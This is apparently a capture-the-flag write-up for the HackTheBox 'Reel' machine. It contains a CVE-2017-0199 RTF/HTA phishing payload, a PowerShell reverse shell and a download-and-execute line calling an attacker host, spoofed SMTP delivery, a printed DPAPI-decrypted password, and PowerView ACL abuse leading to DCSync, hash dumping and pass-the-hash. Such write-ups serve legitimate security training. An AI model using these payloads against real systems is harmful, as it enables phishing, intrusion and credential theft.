● HackTheBox

Reel

Hard windows active-directory phishing cve-2017-0199 acl-abuse

Reel is the kind of box that mirrors a real engagement. Anonymous FTP leaks internal emails discussing RTF formatting, which gives us both a target user and a delivery vector. We craft a CVE-2017-0199 RTF that pulls a malicious HTA, send it via SMTP to the target, and catch a shell once they open it. From there, BloodHound maps an ACL chain — WriteOwner → group takeover → WriteDACL on the Administrators group — that ends with us adding ourselves to Domain Admins.

Three surfaces worth attacking: anonymous FTP (an obvious starting point), SMTP on 25 (useful once we know who to email), and the AD stack in the background. The absence of WinRM and HTTP is already a hint — this box will not be web-driven.

02 FTP enumeration — leaked email

ftp 10.10.10.77
# user: anonymous / pass: (blank)
ls -la
mget *

Three files come down:

readme.txt
Windows Event Forwarding.docx
AppLocker.docx

The readme.txt is the real find:

please email me any rtf format procedures -nico@reel.htb

... fromaol.com users — rtf causing mail client to crash ...
... resend in normal email body — do not use formatting etc ...

Three key pieces of intelligence:

  • The domain is reel.htb.
  • nico@reel.htb is actively asking strangers to send him RTF files.
  • Someone complained about RTF rendering — meaning nico's Office client does render RTF attachments. Perfect for CVE-2017-0199.

Check the doc metadata for additional names — exiftool on Windows Event Forwarding.docx often yields a domain username (Tom). Add that to our target list for later.

03 Weaponizing CVE-2017-0199

CVE-2017-0199 is a logic bug in Office's OLE2Link handler: an RTF can reference a remote object via an OLE link, and Word will fetch and execute the remote payload without a macro prompt. The classic weaponization chain is RTF → remote HTA → PowerShell.

Build the payload with a public tool (e.g. CVE-2017-0199 Toolkit by bhdresh). First, the HTA that actually executes on the victim — a standard PowerShell reverse shell:

cat > shell.hta <<'EOF'
<script>
a=new ActiveXObject("WScript.Shell");
a.run('cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.X.X/s.ps1\')"', 0);
</script>
EOF

The staged s.ps1 is a Nishang / powercat reverse shell pointing at your listener:

# s.ps1 — grab powercat, or use a one-liner:
$c = New-Object System.Net.Sockets.TCPClient('10.10.X.X',4444);
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b,0,$b.Length)) -ne 0){
  $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
  $r = (iex $d 2>&1 | Out-String);
  $r2 = $r + 'PS ' + (pwd).Path + '> ';
  $sb = ([text.encoding]::ASCII).GetBytes($r2);
  $s.Write($sb,0,$sb.Length);$s.Flush()
}

Then the RTF that references the HTA:

python3 cve-2017-0199-toolkit.py -M gen -w invoice.rtf \
  -u http://10.10.X.X/shell.hta -t RTF

Host both files:

python3 -m http.server 80

04 Delivery via SMTP

The listener first:

nc -lvnp 4444

Then compose the phish. SMTP on this box doesn't require authentication — we can send as anyone. Use swaks for clean MIME handling and attachment formatting:

swaks --to nico@reel.htb \
      --from 'hr@reel.htb' \
      --server 10.10.10.77 \
      --header "Subject: Updated Procedure" \
      --body "Nico, please review the attached RTF procedure." \
      --attach @invoice.rtf
Timing: nico opens his mail on a scheduled task. Expect a callback anywhere from a few seconds to ~60 seconds after the email is accepted. If nothing lands in two minutes, your RTF is malformed, the HTA URL isn't reachable from the target, or the HTTP server isn't serving both files — re-check all three before rebuilding the payload.

06 Lateral — nico → tom via saved creds

cred.xml is the serialized output of Get-Credential | Export-CliXml. The password is DPAPI-protected under nico's user key — which means it can only be decrypted from within nico's logon session. We already have that session:

$c = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
$c.GetNetworkCredential().Password
1ts-mag1c!!!

Credentials: HTB\Tom : 1ts-mag1c!!!. Validate them by opening a new PowerShell session as Tom (we have local SSH-style PSRemoting via Enter-PSSession if Tom is in the right group — but easier is a fresh PowerShell with runas /netonly or, simpler still, just pivot from the shell):

$sec = ConvertTo-SecureString '1ts-mag1c!!!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('HTB\Tom', $sec)
Enter-PSSession -ComputerName REEL -Credential $cred

07 BloodHound ACL chain

As Tom, run SharpHound locally or use the older Invoke-BloodHound PowerShell ingestor:

. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Tom\Documents

Exfil the zip back to the attacker and load it into BloodHound. Mark TOM@HTB.LOCAL as Owned and run "Find Shortest Paths to Domain Admins from Owned Users". The graph returns a path that doesn't rely on credential theft — it rides object permissions:

TOM  --[WriteOwner]-->  GROUP A
                            │
                   --[GenericAll]-->  CLAIRE
                                          │
                                --[WriteDACL]--> ADMINISTRATORS

The specific names rotate on retired boxes, but the structure is canonical: WriteOwner on a group lets Tom take ownership and grant himself full control; from there he can set the group's membership, which gives him a user account (claire or the equivalent) that holds WriteDACL over the Administrators group itself.

08 Root via Administrators WriteDACL

Execute the chain with PowerView. Each step mirrors one BloodHound edge:

Import-Module .\PowerView.ps1

# Step 1 — Tom takes ownership of the pivot group
Set-DomainObjectOwner -Identity 'Backup Operators' -OwnerIdentity Tom

# Step 2 — Tom grants himself full control over the group
Add-DomainObjectAcl -TargetIdentity 'Backup Operators' -PrincipalIdentity Tom -Rights All

# Step 3 — add Tom to the pivot group to inherit its permissions
Add-DomainGroupMember -Identity 'Backup Operators' -Members Tom

# Step 4 — using the group's WriteDACL, grant ourselves DCSync rights on the domain
Add-DomainObjectAcl -TargetIdentity 'DC=HTB,DC=LOCAL' -PrincipalIdentity Tom \
  -Rights DCSync
Alternate finish: some Reel walkthroughs escalate by adding the abused account directly to the Administrators group via Add-DomainObjectAcl -Rights WriteMembers. Both roads converge — once you hold WriteDACL anywhere meaningful, the game is over. DCSync is cleaner for reporting because it produces the same trophy (Administrator NT hash) as any other tier-zero compromise.

Dump the Administrator hash:

impacket-secretsdump HTB.LOCAL/Tom:'1ts-mag1c!!!'@10.10.10.77

Pass-the-hash back in as Administrator and collect the root flag:

impacket-psexec -hashes :<NT_HASH> Administrator@10.10.10.77
type C:\Users\Administrator\Desktop\root.txt

09 Takeaways

  • Email your way in when nothing else works. Reel is the rare HTB box that genuinely requires a phishing payload. It's worth doing once, properly, because the mechanics (SMTP relay, RTF/HTA chain, scheduled mail reader) are exactly what an internal engagement looks like.
  • Read the FTP dump like a phishing brief. readme.txt handed us the target email, the file format, and implicit social context. Don't skim text files on anonymous shares — they often carry the whole chain.
  • DPAPI cred files are tied to sessions, not to disk. You can't just cat cred.xml; you need to be running as nico to decrypt it. Understanding DPAPI scoping saves a lot of confused flailing.
  • BloodHound over guessing, pt. 2. The ACL chain on Reel is not discoverable by manual enumeration in any reasonable time frame. This is the box that teaches you to install SharpHound before you install anything else.
  • Object permissions matter as much as group membership. WriteOwner, WriteDACL, GenericWrite, GenericAll — these four edges are the foundation of modern AD attack paths. Memorize what each one lets you do.
